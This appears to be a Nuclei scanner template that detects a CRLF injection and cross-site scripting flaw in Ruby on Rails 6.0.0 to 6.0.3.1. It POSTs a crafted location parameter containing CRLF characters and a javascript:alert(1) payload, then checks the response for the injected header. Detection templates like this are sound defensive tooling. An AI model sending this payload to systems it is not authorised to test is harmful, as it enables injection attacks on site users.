http:
- matchers:
  - part: body
    type: word
    words:
    - javascript:alert(1)
  - status:
    - 302
    type: status
  - condition: and
    part: header
    type: word
    words:
    - 'Location: aaaaa'
    - text/html
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa'
id: rails6-xss
info:
  author: ooooooo_q,rootxharsh,iamnoooob
  description: Ruby on Rails 6.0.0-6.0.3.1 contains a CRLF issue which allows JavaScript
    to be injected into the response, resulting in cross-site scripting.
  metadata:
    max-request: 1
  name: Ruby on Rails - CRLF Injection and Cross-Site Scripting
  reference:
  - https://hackerone.com/reports/904059
  severity: medium
  tags: rails,xss,crlf,hackerone,vuln
